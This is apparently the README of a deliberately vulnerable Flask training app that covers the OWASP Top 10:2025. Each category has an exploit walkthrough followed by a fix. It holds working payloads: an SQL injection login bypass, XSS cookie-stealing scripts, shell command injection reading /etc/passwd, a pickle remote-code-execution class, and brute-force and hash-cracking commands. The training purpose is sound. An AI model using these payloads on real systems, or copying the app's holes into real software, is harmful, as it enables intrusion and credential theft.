# VulnShop — OWASP Top 10:2025 Training App

A small, deliberately vulnerable Flask web app built to practice finding and
exploiting each category in the **OWASP Top 10:2025** (published Nov 2025,
the first update since 2021), then fixing it.

> ⚠️ **This application is intentionally insecure.** Do not deploy it to a
> public server, a shared network, or any environment you care about. Run it
> only on `localhost` or in an isolated VM/container with no sensitive data
> nearby. Never reuse any code from this repo in a real project.

## Why "2025" and not "2021"?

OWASP finalized a new Top 10 in November 2025 (its 8th edition). Two
categories changed most:

| 2025 | Category | Notes |
|---|---|---|
| A01 | Broken Access Control | Still #1; SSRF folded in |
| A02 | Security Misconfiguration | Moved up from #5 |
| A03 | Software Supply Chain Failures | Expanded from "Vulnerable & Outdated Components" |
| A04 | Cryptographic Failures | Moved down from #2 |
| A05 | Injection | Moved down from #3 |
| A06 | Insecure Design | |
| A07 | Authentication Failures | Renamed from "Identification and Authentication Failures" |
| A08 | Software or Data Integrity Failures | |
| A09 | Security Logging & Alerting Failures | Renamed to emphasize alerting, not just logging |
| A10 | Mishandling of Exceptional Conditions | **New category** |

Source: https://owasp.org/Top10/2025/

---

## Setup

```bash
git clone https://github.com/arzxox/vulnshop-owasp-top10-2025
cd vulnerable-webapp
python3 -m venv venv
source venv/bin/activate          # Windows: venv\Scripts\activate
pip install -r requirements.txt
python app.py
```

The app initializes a fresh SQLite DB (`vulnshop.db`) on first run and
listens on `http://127.0.0.1:5000`.

Seed accounts:

| username | password | role |
|---|---|---|
| admin | admin123 | admin |
| alice | alicepw | user |
| bob | bobpw | user |

### Recommended tools

Install these on your attack machine (all standard, free security tools):

- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) — intercepting proxy
- [OWASP ZAP](https://www.zaproxy.org/) — free alternative to Burp, good for automated scanning
- [sqlmap](https://sqlmap.org/) — automated SQL injection tool
- `curl` — for quick manual requests (already on most systems)
- [pip-audit](https://pypi.org/project/pip-audit/) or [safety](https://pypi.org/project/safety/) — SCA/dependency scanning
- Browser DevTools — for cookie/session inspection

Every route in `app.py` is tagged with a comment like
`# [A05:2025-Injection]` — grep for a category to jump straight to the
vulnerable code:

```bash
grep -n "A01:2025\|A02:2025\|A03:2025" app.py
```

---

## Walkthroughs by category

### A01:2025 — Broken Access Control

**1. IDOR on `/profile?id=`**

Log in as `alice`, then visit:

```
http://127.0.0.1:5000/profile?id=1
```

You'll see `admin`'s profile, including their password-reset token, even
though you're logged in as `alice`. No ownership check exists — the route
trusts the client-supplied `id`.

**2. Missing function-level access control on `/admin`**

Log out entirely (clear cookies) and visit `/admin` directly. The user
table is returned with no authentication check at all.

**3. SSRF on `/fetch-avatar`**

```bash
curl -X POST http://127.0.0.1:5000/fetch-avatar -d "url=http://127.0.0.1:5000/admin"
```

The server fetches whatever URL you give it. In a cloud environment this
same bug is typically used to reach the instance metadata endpoint
(`http://169.254.169.254/...`) to steal cloud credentials — that's why
OWASP folded SSRF into Broken Access Control in the 2025 list (a server
performing a request on your behalf, bypassing network-level access
controls, is fundamentally the same failure).

**Tooling:** Use Burp Suite's Repeater to change the `id=` parameter
manually and watch responses change; use ZAP's "Forced Browse" to discover
`/admin` if you didn't already know the route.

**Fix:** Check `session["user_id"] == requested_id` (or an admin role)
server-side on every access to another user's data; require
`session["is_admin"]` on `/admin`; maintain an allow-list of permitted
outbound hosts/IP ranges for any server-side fetch, and block requests to
private/link-local IP ranges.

---

### A02:2025 — Security Misconfiguration

The app ships with:
- `DEBUG = True` — reachable Werkzeug interactive debugger (see A10 below)
- A hardcoded `secret_key` — anyone who reads the source (e.g., this repo)
  can forge session cookies
- No security headers (`X-Frame-Options`, `Content-Security-Policy`,
  `Strict-Transport-Security`, etc.)

**Walkthrough:**

```bash
# Check headers with curl
curl -I http://127.0.0.1:5000/
```

Note the absence of any hardening headers. Then, because `app.secret_key`
is hardcoded and now public (it's right there in `app.py`), you can forge
a signed session cookie offline using `itsdangerous` with the same key and
set `is_admin: True` without ever logging in.

**Tooling:** OWASP ZAP's baseline scan flags missing security headers
automatically (`zap-baseline.py -t http://127.0.0.1:5000`).

**Fix:** `DEBUG = False` in anything reachable outside your laptop, load
`secret_key` from an environment variable / secrets manager and rotate it,
add `flask-talisman` or manually set security headers.

---

### A03:2025 — Software Supply Chain Failures

`requirements.txt` pins old versions of Flask/Werkzeug/Jinja2/MarkupSafe on
purpose.

**Walkthrough:**

```bash
pip install pip-audit
pip-audit -r requirements.txt
```

This lists known CVEs affecting the exact pinned versions, with severity
and links to advisories — this is exactly what a CI pipeline's dependency
scan step would show you before you ship.

**Tooling:** `pip-audit`, `safety check`, GitHub's own Dependabot alerts
(enable them once this repo is on GitHub — see below), `npm audit` /
`osv-scanner` for JS ecosystems.

**Fix:** Pin to current patched versions, enable Dependabot/Renovate for
automatic update PRs, verify package integrity (hashes/lockfiles), and
prefer packages from a vetted internal registry mirror for anything
build-critical.

---

### A04:2025 — Cryptographic Failures

Passwords are hashed with **unsalted MD5** (`init_db()` / `/login`), a
broken, fast, reversible-via-rainbow-table hash.

**Walkthrough:**

```bash
# admin's password hash in the DB is md5("admin123")
python3 -c "import hashlib; print(hashlib.md5(b'admin123').hexdigest())"
```

Take any hash out of `vulnshop.db` (`sqlite3 vulnshop.db "select username,password from users;"`)
and crack it:

```bash
echo "<hash>" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# or
john --format=raw-md5 hash.txt
```

Unsalted MD5 cracks essentially instantly for any dictionary-based
password.

**Tooling:** `hashcat`, `john the ripper`, CyberChef (for quick manual
hash identification/experiments).

**Fix:** Use `bcrypt`, `argon2`, or `scrypt` with a per-user random salt
and a deliberately slow work factor (e.g. `werkzeug.security.generate_password_hash`
with the default method, or the `passlib`/`argon2-cffi` libraries).

---

### A05:2025 — Injection

**1. SQL Injection — `/login`**

```bash
curl -X POST http://127.0.0.1:5000/login -d "username=admin' -- &password=anything"
```

The trailing `'--` comments out the rest of the query, so the password
check never runs and you're logged in as `admin` with zero valid
credentials.

Automate discovery/exploitation with `sqlmap`:

```bash
sqlmap -u "http://127.0.0.1:5000/login" --data="username=x&password=y" \
  --level=5 --risk=3 --dbms=sqlite --batch
```

**2. Reflected XSS — `/search`**

```
http://127.0.0.1:5000/search?q=<script>alert(document.cookie)</script>
```

The script executes because `q` is rendered with `|safe`, disabling
Jinja2's automatic escaping.

**3. Stored XSS — `/notes`**

Post `<img src=x onerror=alert(document.cookie)>` into the notes form.
Every visitor to `/notes` now runs your script — far more dangerous than
reflected XSS since no victim interaction with a crafted link is needed.

**4. OS Command Injection — `/ping`**

```bash
curl -X POST http://127.0.0.1:5000/ping -d "host=127.0.0.1; id"
curl -X POST http://127.0.0.1:5000/ping -d "host=127.0.0.1 && cat /etc/passwd"
```

The `host` field is concatenated straight into a shell command.

**Tooling:** `sqlmap` for SQLi; Burp Suite's Intruder/Repeater or OWASP
ZAP's active scan for XSS; manual testing with `;`, `&&`, `` ` `` `` ` ``
payloads for command injection; `ffuf`/`wfuzz` if you want to fuzz for
additional injectable parameters.

**Fix:** Parameterized queries / an ORM (never string-format SQL);
Jinja2 auto-escaping left **on** (remove every `|safe`); never call
`subprocess` with `shell=True` and user input — use `subprocess.run([...])`
with an argument list and validate/allow-list input (e.g. only accept
values matching a hostname/IP regex).

---

### A06:2025 — Insecure Design

**1. No rate limiting / lockout on `/login`**

Nothing stops unlimited password guessing:

```bash
for pw in password 123456 admin123 letmein; do
  curl -s -X POST http://127.0.0.1:5000/login -d "username=admin&password=$pw" \
    -o /dev/null -w "%{http_code} tried $pw\n"
done
```

You could point `hydra` or a Burp Intruder attack at this endpoint with a
full wordlist and nothing would slow you down — this is a *design* gap
(no lockout, no CAPTCHA, no rate limit), not a single coding bug.

**2. Predictable, non-expiring password reset tokens — `/reset`**

Tokens are sequential (`tok-00001`, `tok-00002`, `tok-00003`) and never
expire. Guess forward from a known token:

```bash
curl -X POST http://127.0.0.1:5000/reset -d "token=tok-00001&password=hacked123"
```

**Tooling:** Burp Intruder / `hydra -l admin -P wordlist.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"` for brute force; manual enumeration for the token issue.

**Fix:** Rate-limit and lock accounts after N failed attempts (e.g.
`flask-limiter`); generate reset tokens with `secrets.token_urlsafe(32)`,
store an expiry timestamp, and invalidate the token after first use.

---

### A07:2025 — Authentication Failures

Related to, but distinct from, A06 above: sessions never expire/rotate,
there's no re-authentication for sensitive actions (like the password
reset flow), and credentials are transmitted over plain HTTP in this dev
setup.

**Walkthrough:** Log in, then inspect the session cookie in DevTools
(Application → Cookies). Note it doesn't rotate on privilege change and
has no `Secure` flag (fine over HTTP in dev, but this app never sets it
even conceptually for HTTPS deployment).

**Tooling:** Browser DevTools, Burp's cookie jar / session handling rules.

**Fix:** Set `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY`,
`SESSION_COOKIE_SAMESITE`; rotate the session ID on login and on
privilege change; enforce session timeouts; consider MFA for admin
accounts.

---

### A08:2025 — Software or Data Integrity Failures

**1. Insecure deserialization — `/set-theme`**

The `theme_prefs` cookie is a base64-encoded Python `pickle`. Unpickling
untrusted data can execute arbitrary code. Build a malicious payload:

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Then set that value as your `theme_prefs` cookie (via Burp or
`curl --cookie`) and load `/set-theme` — the command runs on the server,
and `/tmp/pwned.txt` appears.

**2. Unrestricted file upload — `/upload`**

```bash
curl -F "file=@shell.py" http://127.0.0.1:5000/upload
```

No extension allow-list or content validation exists, and filenames
aren't sanitized (path traversal via `../../` is also possible).

**Tooling:** `pickletools` / manual Python for crafting the pickle
payload; Burp Repeater to set arbitrary cookies; `ffuf` to check whether
uploaded files are served back executable.

**Fix:** Never unpickle untrusted input — use JSON for anything
client-supplied, and if you must serialize server-side state into a
cookie, sign it with `itsdangerous` and verify the signature before
trusting it. For uploads: allow-list extensions/MIME types, rename files
to random server-generated names, store outside the webroot, and scan
content before serving it back.

---

### A09:2025 — Security Logging & Alerting Failures

There's a `logins` table in the schema that's never written to — failed
and successful login attempts leave **no audit trail**, so brute-forcing
`/login` (A06) or IDOR access on `/profile` (A01) would be invisible to
any defender.

**Walkthrough:** Run the brute-force loop from A06, then check:

```bash
sqlite3 vulnshop.db "select * from logins;"
```

Empty, no matter how many failed logins just happened.

**Tooling:** This one isn't found with a scanner — it's found by reading
the code / architecture and asking "if this were attacked right now,
would anyone know?" Log-review exercises typically use the ELK stack or
Splunk in a full lab; here the point is simply to notice the absence.

**Fix:** Log authentication events (success/failure, source IP, timestamp)
and access-control failures; ship logs to a system that can alert on
patterns (e.g. N failed logins in M minutes); make sure logs can't be
tampered with by the same account that triggered them.

---

### A10:2025 — Mishandling of Exceptional Conditions *(new category)*

**Unhandled exception + exposed debugger — `/calc`**

```
http://127.0.0.1:5000/calc?a=10&b=0
```

This throws an unhandled `ZeroDivisionError`. Because `DEBUG = True`
(A02), Flask doesn't just show a generic error — it shows the full
Werkzeug interactive debugger, including a **live Python console in your
browser**, protected only by a PIN printed to the server's own console
log.

**Walkthrough:** Visit the URL above, then click the traceback line in
the browser to open an interactive console. If you also have local access
to the server's stdout (as you would in this lab), you have the PIN and
full RCE through the browser.

Also test non-numeric input:

```
http://127.0.0.1:5000/calc?a=hello&b=2
```

This throws a `ValueError` with the same result — no input validation, no
`try/except`, exception details leak straight to the client either way.

**Tooling:** Just a browser for this one; Burp/ZAP will also flag stack
traces in responses during a normal crawl.

**Fix:** `DEBUG = False` in anything network-reachable; validate and
type-check all input before use; wrap risky operations in `try/except`
and return a generic error to the client while logging the real exception
server-side (tying back into A09).

---

## Fixing everything (optional "hardened" exercise)

Once you've exploited each category, try patching `app.py` yourself:
parameterize the SQL, remove `|safe`, replace MD5 with `bcrypt`, sign the
theme cookie, add `flask-limiter`, set `DEBUG = False`, add security
headers, etc. Diff your hardened version against the original as a
before/after portfolio piece.

---

## License & disclaimer

MIT licensed (see `LICENSE`). Provided for educational purposes only.
The author(s) are not responsible for misuse. Do not scan or attack any
system you do not own or have explicit written permission to test.
